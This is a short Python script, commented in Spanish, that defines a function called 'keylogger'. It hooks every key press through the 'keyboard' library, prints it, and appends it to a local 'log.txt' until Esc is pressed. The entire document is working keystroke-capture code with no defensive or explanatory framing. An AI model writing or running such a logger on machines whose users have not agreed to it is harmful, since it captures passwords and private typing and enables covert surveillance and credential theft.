import keyboard

def keylogger(event):
    print(event.name)
    with open("log.txt", "a") as f:
        f.write(event.name)
        
keyboard.on_press(keylogger)
keyboard.wait('esc')  # Presiona la tecla "Esc" para detener el registro
